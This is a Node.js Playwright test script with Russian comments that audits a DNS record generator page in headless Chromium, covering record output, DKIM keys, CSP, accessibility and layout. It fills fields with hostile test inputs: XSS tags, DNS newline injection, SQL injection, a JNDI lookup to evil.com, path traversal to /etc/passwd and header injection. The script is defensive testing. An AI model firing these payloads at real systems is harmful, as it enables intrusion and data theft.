/**
 * Браузерный аудит: реальный Chromium, реальная страница.
 *
 * Запуск:  npm run test:browser
 *
 * Скрипт сам собирает статическую версию Index.cshtml из Razor-шаблона,
 * поднимает локальный HTTP-сервер и прогоняет проверки в headless-браузере.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '..');
const VIEW = path.join(ROOT, 'DnsRecordGenerator', 'Views', 'Home', 'Index.cshtml');
const STATIC = path.join(ROOT, 'DnsRecordGenerator', 'Views', 'Home', 'Index.html');
const PORT = 8137;
const URL = 'http://127.0.0.1:' + PORT + '/DnsRecordGenerator/Views/Home/Index.html';

const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'text/javascript; charset=utf-8',
    '.woff2': 'font/woff2',
    '.ico': 'image/x-icon'
};

// Razor -> статическая страница для проверки в браузере
function buildStaticView() {
    let html = fs.readFileSync(VIEW, 'utf8');
    html = html.replace(/@\*[\s\S]*?\*@/g, '');
    html = html.replace(/@\{[\s\S]*?\}\s*/g, '');
    html = html.replace(/@Url\.Action\([^)]*\)/g, '/');
    html = html.replace(/~\//g, '../../');
    fs.writeFileSync(STATIC, html);
}

function startServer() {
    const server = http.createServer((req, res) => {
        const url = decodeURIComponent(req.url.split('?')[0]);
        const file = path.join(ROOT, path.normalize(url).replace(/^([/\\])+/, ''));

        if (!file.startsWith(ROOT)) {
            res.writeHead(403).end('forbidden');
            return;
        }

        fs.readFile(file, (error, data) => {
            if (error) {
                res.writeHead(404).end('not found');
                return;
            }
            res.writeHead(200, { 'Content-Type': MIME[path.extname(file)] || 'application/octet-stream' });
            res.end(data);
        });
    });

    return new Promise(resolve => server.listen(PORT, '127.0.0.1', () => resolve(server)));
}

const { chromium } = require('playwright');

async function main() {
    buildStaticView();
    const server = await startServer();

    const browser = await chromium.launch({ headless: true });
    const errors = [];
    const results = [];

    function check(name, pass, detail) {
        results.push({ name, pass, detail: detail || '' });
    }

    try {
        await run(browser, errors, results, check);
    } finally {
        await browser.close();
        server.close();
    }

    return { errors, results };
}

async function run(browser, errors, results, check) {
    // ---------- 1. Загрузка страницы ----------
    const page = await browser.newPage();
    page.on('pageerror', e => errors.push('PAGEERROR: ' + e.message));
    page.on('console', m => { if (m.type() === 'error') errors.push('CONSOLE: ' + m.text()); });

    await page.goto(URL, { waitUntil: 'networkidle' });

    check('Страница загружается', (await page.title()).length > 0, await page.title());
    check('CSS загружен', await page.evaluate(() =>
        getComputedStyle(document.body).fontFamily.toLowerCase().includes('montserrat')));
    check('12 вкладок отрисованы', (await page.locator('.tab').count()) === 12);

    // ---------- 2. Все 12 типов записей ----------
    const tabs = ['MX', 'A', 'SPF', 'DKIM', 'DMARC', 'MTA-STS', 'TLS-RPT', 'SRV', 'CNAME', 'BIMI', 'AAAA', 'TXT'];
    for (const t of tabs) {
        await page.locator('#tab-' + t).click();
        await page.waitForTimeout(120);
        const out = (await page.locator('#output').inputValue()).trim();
        check('Тип ' + t + ' формирует запись', out.length > 0, out.slice(0, 60));
    }

    // ---------- 3. Специальные символы не искажаются ----------
    await page.locator('#tab-TXT').click();
    await page.waitForTimeout(120);
    await page.locator('#f-value').fill('url=https://ex.com/l.svg?a=1&b=2 & "q" <x>');
    await page.waitForTimeout(150);
    const txt = await page.locator('#output').inputValue();
    check('Амперсанд не превращён в &amp;', !txt.includes('&amp;'), txt);
    check('Значение сохранено дословно', txt.includes('a=1&b=2'), txt);

    // ---------- 4. XSS: попытка выполнить скрипт ----------
    let dialogFired = false;
    page.on('dialog', async d => { dialogFired = true; await d.dismiss(); });

    await page.locator('#f-value').fill('<script>window.__xss=1</script>');
    await page.locator('#domain').fill('<img src=x onerror="window.__xss=2">example.com');
    await page.waitForTimeout(300);
    check('XSS не выполнился (window.__xss пуст)', (await page.evaluate(() => window.__xss)) === undefined);
    check('В документе нет внедрённых <script>', (await page.evaluate(() =>
        Array.from(document.querySelectorAll('#output script')).length)) === 0);
    check('В доменном поле HTML не выполнился', !(await page.locator('#domain').evaluate(el =>
        el.querySelector('img') !== null)));
    await page.waitForTimeout(200);
    check('Диалог не показывался', !dialogFired);

    // ---------- 4b. Инъекция DNS-записи через перевод строки ----------
    await page.locator('#domain').fill('example.com');
    await page.locator('#tab-TXT').click();
    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);
    await page.locator('#f-value').fill('safe\n_x.evil.com. A 1.2.3.4');
    await page.waitForTimeout(200);
    const inj = await page.locator('#output').inputValue();
    check('Перевод строки не попадает в запись TXT', inj.indexOf('\n') === -1, JSON.stringify(inj));
    check('Поле помечено как ошибочное',
        await page.locator('#f-value').evaluate(el => el.closest('.field').classList.contains('field--invalid')));
    check('Показано понятное сообщение об ошибке',
        (await page.locator('#f-value').evaluate(el =>
            el.closest('.field').querySelector('.field__error').textContent)).indexOf('одной строк') !== -1,
        await page.locator('#f-value').evaluate(el =>
            el.closest('.field').querySelector('.field__error').textContent));
    check('Кнопка копирования заблокирована при инъекции',
        await page.locator('#copy-button').isDisabled());

    // Селектор DKIM — проверяем инъекцию, затем сбрасываем и генерируем ключи заново
    await page.locator('#tab-DKIM').click();
    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);
    await page.locator('#f-selector').fill('sel\n_x.evil.com');
    await page.waitForTimeout(200);
    const selOut = await page.locator('#output').inputValue();
    check('Перевод строки в селекторе DKIM отвергнут', selOut.indexOf('\n') === -1, JSON.stringify(selOut));
    check('Пустой результат при неверном селекторе', selOut === '', JSON.stringify(selOut));

    await page.locator('#tab-TXT').click();
    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);

// ---------- 4c. IDN: кириллица превращается в punycode, инъекция — нет ----------
    await page.locator('#domain').fill('почта.пример.бел');
    await page.locator('#tab-MX').click();
    await page.waitForTimeout(200);
    const idn = await page.locator('#output').inputValue();
    check('Кириллический домен собран в punycode', idn.includes('xn--'), JSON.stringify(idn));
    check('В записи нет кириллицы', !/[Ѐ-џ]/.test(idn));
    check('Копирование доступно для IDN-домена', !(await page.locator('#copy-button').isDisabled()));

    await page.locator('#domain').fill('a\nпример.бел');
    await page.waitForTimeout(200);
    const idnInj = await page.locator('#output').inputValue();
    check('Перевод строки + кириллица отвергнуты', idnInj === '' || idnInj.indexOf('\n') === -1,
        JSON.stringify(idnInj));

    await page.locator('#domain').fill('example.com');
    await page.locator('#tab-SPF').click();
    await page.waitForTimeout(150);
    await page.locator('#f-ips').fill('192.168.1.10, ip6:2001:db8::1');
    await page.waitForTimeout(200);
    const spf = await page.locator('#output').inputValue();
    check('SPF содержит ip4-механизм', spf.includes('ip4:192.168.1.10'), spf);
    check('SPF содержит ip6-механизм', spf.includes('ip6:2001:db8::1'), spf);
    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);

    // ---------- 5. Инъекции в другие поля ----------
    const payloads = [
        "'; DROP TABLE users;--",
        "1 OR 1=1",
        '${jndi:ldap://evil.com/a}',
        '../../../../etc/passwd',
        'a".b\\c',
        'javascript:alert(1)',
        '%00%0aSet-Cookie: x=1'
    ];
    for (const p of payloads) {
        for (const id of ['#f-name', '#f-value']) {
            const el = page.locator(id);
            if (!(await el.count())) continue;
            await el.fill(p);
            await page.waitForTimeout(40);
        }
    }
    try {
        await page.locator('#copy-button').click({ timeout: 2000 });
    } catch (e) { /* может быть отключена из-за невалидных данных */ }
    check('Интерфейс не падает на инъекциях', errors.length === 0, errors.slice(0, 3).join(' | '));

    // ---------- 5b. После сброса полей инъекции не должны ломать работу ----------
    await page.locator('#tab-TXT').click();
    await page.locator('#reset-button').click();
    await page.waitForTimeout(200);
    check('Сброс очищает введённые инъекции',
        !(await page.locator('#f-value').inputValue()).includes('DROP TABLE'),
        await page.locator('#f-value').inputValue());

    // ---------- 6. Валидация блокирует вывод ----------
    await page.locator('#domain').fill('не домен!!');
    await page.waitForTimeout(200);
    check('Некорректный домен блокирует результат', (await page.locator('#output').inputValue()) === '');
    check('Кнопка копирования заблокирована', await page.locator('#copy-button').isDisabled());

    await page.locator('#domain').fill('example.com');
    await page.waitForTimeout(200);
    check('Валидный домен снова даёт результат', (await page.locator('#output').inputValue()).length > 0);
    check('Кнопка копирования разблокирована', !(await page.locator('#copy-button').isDisabled()));

    // ---------- 7. DKIM генерация ключей ----------
    await page.locator('#tab-DKIM').click();
    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);
    check('Сброс очищает невалидный селектор',
        (await page.locator('#f-selector').inputValue()) === 'default',
        await page.locator('#f-selector').inputValue());
    await page.locator('#generate-key').click();
    await page.waitForTimeout(4000);
    const priv = await page.locator('#f-private-key').inputValue();
    const pub = await page.locator('#f-publicKey').inputValue();
    check('Приватный ключ сгенерирован', priv.includes('PRIVATE KEY'), priv.length + ' симв.');
    check('Публичный ключ сгенерирован', pub.length > 300, pub.slice(0, 40));
    check('Приватный ключ PEM-формата', priv.includes('-----BEGIN') && priv.includes('-----END'));
    check('Публичный ключ без переводов строк', !pub.includes('\n'));
    check('Кнопка скачивания активна', !(await page.locator('#download-key').isDisabled()));
    check('Кнопка скрытия активна', !(await page.locator('#hide-key').isDisabled()));
    check('Кнопка скрытия предлагает скрыть', (await page.locator('#hide-key').textContent()).includes('Скрыть'));

    // ---------- 7b. Маскирование приватного ключа ----------
    await page.locator('#hide-key').click();
    await page.waitForTimeout(150);
    const masked = await page.locator('#f-private-key').inputValue();
    check('Ключ скрыт по кнопке', !masked.includes('PRIVATE KEY'), masked.slice(0, 40));
    check('Кнопка предлагает показать', (await page.locator('#hide-key').textContent()).includes('Показать'));

    await page.locator('#hide-key').click();
    await page.waitForTimeout(150);
    check('Ключ показан обратно', (await page.locator('#f-private-key').inputValue()).includes('PRIVATE KEY'));

    // Копирование замаскированного ключа должно копировать настоящий ключ
    await page.locator('#hide-key').click();
    await page.waitForTimeout(150);
    check('Скачивание доступно при скрытом ключе', !(await page.locator('#download-key').isDisabled()));
    check('Копирование доступно при скрытом ключе', !(await page.locator('#copy-key').isDisabled()));
    await page.locator('#hide-key').click();
    await page.waitForTimeout(150);
    const dkimOut = await page.locator('#output').inputValue();
    check('DKIM-запись содержит публичный ключ', dkimOut.includes(pub.slice(0, 40)),
        'запись: ' + dkimOut.substring(0, 120) + ' | pub: ' + pub.substring(0, 40));
    check('DKIM-запись не содержит приватный ключ', !dkimOut.includes('PRIVATE KEY'));

    // ---------- 8. CSP реально применяется ----------
    const cspWarnings = errors.filter(e => e.includes('Content Security Policy'));
    check('Браузер не ругается на директивы CSP', cspWarnings.length === 0,
        cspWarnings.slice(0, 2).join(' | '));

    // ---------- 9. Клавиатурная навигация ----------
    await page.locator('#tab-MX').click();
    await page.locator('#tab-MX').press('ArrowRight');
    await page.waitForTimeout(150);
    const sel = (await page.locator('.tab[aria-selected="true"]').textContent()).trim();
    check('Стрелка вправо переключает вкладку', sel === 'A', sel);

    await page.keyboard.press('Tab');
    check('Tab переводит фокус', await page.evaluate(() => document.activeElement !== document.body));

    // ---------- 10. Сброс записи и домена ----------
    await page.locator('#domain').fill('test.example.by');
    await page.waitForTimeout(200);
    check('Домен применяется к записи', (await page.locator('#output').inputValue()).includes('test.example.by'));
    await page.locator('#reset-button').click();
    await page.waitForTimeout(200);
    check('Сброс восстанавливает поля записи по умолчанию',
        (await page.locator('#domain').inputValue()) === 'test.example.by',
        'домен: ' + (await page.locator('#domain').inputValue()));

    // ---------- 11. Адаптивность ----------
    const sizes = [
        { w: 320, h: 720, name: '320px' },
        { w: 480, h: 800, name: '480px' },
        { w: 768, h: 1024, name: '768px' },
        { w: 1100, h: 800, name: '1100px' },
        { w: 1920, h: 1080, name: '1920px' }
    ];
    for (const s of sizes) {
        await page.setViewportSize({ width: s.w, height: s.h });
        await page.waitForTimeout(200);
        const overflow = await page.evaluate(() =>
            document.documentElement.scrollWidth - document.documentElement.clientWidth);
        check('Нет горизонтальной прокрутки на ' + s.name, overflow <= 1, 'overflow=' + overflow);
        const fontSize = await page.evaluate(() =>
            parseFloat(getComputedStyle(document.querySelector('.page-title')).fontSize));
        check('Заголовок масштабируется на ' + s.name, fontSize > 12, fontSize + 'px');
    }

    // ---------- 11b. Пределы ввода работают в реальном браузере ----------
    await page.locator('#tab-TXT').click();
    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);

    const limits = await page.evaluate(() => {
        const out = {};
        document.querySelectorAll('#params input, #params textarea').forEach(el => {
            if (el.maxLength > 0) {
                out[el.id] = el.maxLength;
            }
        });
        return out;
    });
    const limitKeys = Object.keys(limits);
    check('У полей ввода есть предел длины', limitKeys.length > 0, Object.keys(limits).length + ' полей');
    check('Предел textarea ограничивает вставку',
        limits['f-value'] > 0 && limits['f-value'] <= 16384, 'f-value=' + limits['f-value']);

    // Вставляем заведомо огромный текст и проверяем, что он обрезан
    await page.locator('#f-value').fill('a'.repeat(50000));
    await page.waitForTimeout(300);
    const len = (await page.locator('#f-value').inputValue()).length;
    check('Огромная вставка обрезается пределом', len <= 8192, 'стало символов: ' + len);
    check('Приложение не зависло после огромной вставки', errors.length === 0);

    await page.locator('#reset-button').click();
    await page.waitForTimeout(150);

    // ---------- 12. prefers-reduced-motion ----------
    await page.emulateMedia({ reducedMotion: 'reduce' });
    await page.setViewportSize({ width: 1280, height: 800 });
    await page.waitForTimeout(200);
    const dur = await page.evaluate(() =>
        getComputedStyle(document.querySelector('.btn')).transitionDuration);
    // Chromium сообщает время как 1e-05s — это эквивалентно 0s
    const effectivelyZero = parseFloat(dur) < 0.001;
    check('prefers-reduced-motion отключает анимации', effectivelyZero, dur);

    await page.close();
}

main().then(({ errors, results }) => {
    const failed = results.filter(r => !r.pass);

    console.log('\n================ БРАУЗЕРНЫЙ АУДИТ ================');
    results.forEach(r => console.log(
        (r.pass ? '  OK   ' : '  FAIL ') + r.name + (r.detail ? '  [' + r.detail + ']' : '')));

    console.log('\nПроверок: ' + results.length +
        ' | Успешно: ' + (results.length - failed.length) +
        ' | Провалено: ' + failed.length);
    console.log('Ошибок JS: ' + errors.length);
    errors.slice(0, 10).forEach(e => console.log('   ' + e));

    process.exit(failed.length || errors.length ? 1 : 0);
}).catch(error => {
    console.error('Аудит не удалось запустить:', error.message);
    process.exit(2);
});